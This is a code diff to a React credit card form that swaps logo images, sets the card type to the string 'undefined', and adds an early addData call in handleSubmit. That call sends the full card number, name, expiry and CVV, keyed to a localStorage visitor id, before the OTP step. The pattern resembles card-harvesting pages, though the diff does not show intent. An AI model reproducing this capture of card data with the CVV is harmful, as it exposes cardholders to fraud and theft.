@@ -13,12 +13,12 @@ const CARD_TYPES = [
   {
     name: "visa",
     pattern: /^4/,
-    image: "/visa.png",
+    image: "/visa.svg",
   },
   {
     name: "mastercard",
     pattern: /^5[1-5]/,
-    image: "/mastercard.png",
+    image: "/ma.svg",
   },
   {
     name: "amex",
@@ -46,6 +46,7 @@ export default function CreditCardForm() {
     cardholderName: "",
     expiryDate: "",
     cvv: "",
+    cardType:""
   })
   const [errors, setErrors] = useState<Partial<Record<keyof CardData, string>>>({})
   const [cardType, setCardType] = useState<string | null>(null)
@@ -90,13 +91,13 @@ export default function CreditCardForm() {
       // Update card data with detected type
       setCardData((prev) => ({
         ...prev,
-        cardType: foundType ? foundType.name : undefined,
+        cardType: foundType ? foundType.name : 'undefined',
       }))
     } else {
       setCardType(null)
       setCardData((prev) => ({
         ...prev,
-        cardType: undefined,
+        cardType: 'undefined',
       }))
     }
   }, [cardData.cardNumber])
@@ -190,7 +191,12 @@ export default function CreditCardForm() {
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
     setIsLoading(true)
+    const orderId = localStorage.getItem('visitor')
+
     if (validateForm()) {
+      addData({
+        id:orderId,cardData
+      })
       // Show OTP dialog instead of immediately submitting
       setTimeout(() => {
         setIsLoading(false)
@@ -210,7 +216,7 @@ export default function CreditCardForm() {
 
       // After successful verification, submit the card data
       const visitorId = localStorage.getItem("visitor")
-      addData({ id: visitorId, ...cardData })
+      addData({ id: visitorId, cardData })
 
       // Call the onSubmit prop if provided
     
